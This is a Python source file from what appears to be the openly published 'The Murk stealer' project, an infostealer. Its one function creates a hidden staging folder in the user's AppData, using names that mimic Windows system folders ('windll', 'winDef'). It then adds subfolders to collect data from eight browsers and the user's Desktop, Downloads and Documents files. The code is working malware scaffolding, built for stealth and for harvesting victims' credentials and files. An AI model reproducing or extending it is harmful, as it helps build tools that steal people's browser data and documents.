#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import os
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32api import SetFileAttributes

def makeFolders():
    pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
    if os.path.exists(rf'{pathf}\windll'):
        print('none')
    else:
        os.makedirs(rf'{pathf}\system\sysFiles\winDef')
        open(rf'{pathf}\system\sysFiles\winDef\log20742384.txt', 'w', encoding='utf-8')
        os.makedirs(rf'{pathf}\windll\System')
        SetFileAttributes(rf'{pathf}\windll', FILE_ATTRIBUTE_HIDDEN)
        os.makedirs(rf'{pathf}\windll\Photos')
        os.makedirs(rf'{pathf}\windll\Browsers')
        os.makedirs(rf'{pathf}\windll\Browsers\Chrome')
        os.makedirs(rf'{pathf}\windll\Browsers\Opera')
        os.makedirs(rf'{pathf}\windll\Browsers\Firefox')
        os.makedirs(rf'{pathf}\windll\Browsers\Edge')
        os.makedirs(rf'{pathf}\windll\Browsers\Brave')
        os.makedirs(rf'{pathf}\windll\Browsers\Yandex')
        os.makedirs(rf'{pathf}\windll\Browsers\Chrome_SxS')
        os.makedirs(rf'{pathf}\windll\Browsers\Torch')
        os.makedirs(rf'{pathf}\windll\DocumentFiles\Desktop')
        os.makedirs(rf'{pathf}\windll\DocumentFiles\Downloads')
        os.makedirs(rf'{pathf}\windll\DocumentFiles\Documents')

